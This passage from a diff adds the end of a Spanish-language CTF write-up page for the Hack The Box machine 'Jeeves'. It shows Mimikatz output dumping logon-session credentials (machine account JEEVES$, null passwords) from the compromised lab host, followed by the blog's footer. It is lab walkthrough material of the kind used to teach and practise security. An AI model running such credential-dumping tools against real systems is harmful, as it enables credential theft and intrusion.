+User Name         : <span class="o">(</span>null<span class="o">)</span>
+Domain            : <span class="o">(</span>null<span class="o">)</span>
+Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+Logon Time        : 7/4/2023 12:08:57 AM
+SID               :
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 <span class="p">;</span> 999 <span class="o">(</span>00000000:000003e7<span class="o">)</span>
+Session           : UndefinedLogonType from 0
+User Name         : JEEVES<span class="err">$</span>
+Domain            : WORKGROUP
+Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+Logon Time        : 7/4/2023 12:08:57 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	<span class="k">*</span> Username : JEEVES<span class="err">$</span>
+	<span class="k">*</span> Domain   : WORKGROUP
+	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
+	kerberos :	
+	<span class="k">*</span> Username : jeeves<span class="err">$</span>
+	<span class="k">*</span> Domain   : WORKGROUP
+	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
+	ssp :	
+	credman :	
+
+mimikatz<span class="o">(</span>commandline<span class="o">)</span> <span class="c"># exit</span>
+Bye!
+
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>rives&gt;
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hackthebox/machines/medium/2024/06/22/jeeves.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
